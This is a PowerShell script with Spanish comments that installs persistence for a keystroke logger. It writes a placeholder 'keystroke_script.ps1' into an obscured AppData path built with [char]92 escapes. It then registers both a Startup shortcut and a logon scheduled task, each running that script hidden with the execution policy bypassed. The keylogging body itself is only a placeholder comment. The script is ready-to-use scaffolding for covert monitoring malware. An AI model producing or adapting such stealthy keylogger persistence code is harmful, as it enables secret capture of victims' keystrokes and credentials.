# Ruta predeterminada donde se guardará el script
$ScriptDirectory = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data"

# Crear el directorio si no existe
if (-not (Test-Path -Path $ScriptDirectory -PathType Container)) {
    New-Item -Path $ScriptDirectory -ItemType Directory
}

# Guardar el script de detección de pulsaciones de teclas en la ruta predeterminada
$ScriptPath = Join-Path -Path $ScriptDirectory -ChildPath "keystroke_script.ps1"
@"
# Aquí va tu script de detección de pulsaciones de teclas
"@ | Set-Content -Path $ScriptPath

# Ruta del acceso directo en la carpeta de inicio de Windows
$ShortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keystroke_script.lnk"

# Crear acceso directo para ejecutar el script de detección de pulsaciones de teclas al iniciar sesión
$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"""
$Shortcut.Save()

# Agregar el script de detección de pulsaciones de teclas a la tarea de inicio programado para ejecutarlo al iniciar Windows
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$ScriptPath"""
$TaskTrigger = New-ScheduledTaskTrigger -AtLogon
$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName "EjecutarScriptAlInicio" -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Description "Ejecuta el script de detección de pulsaciones de teclas al iniciar sesión en Windows."
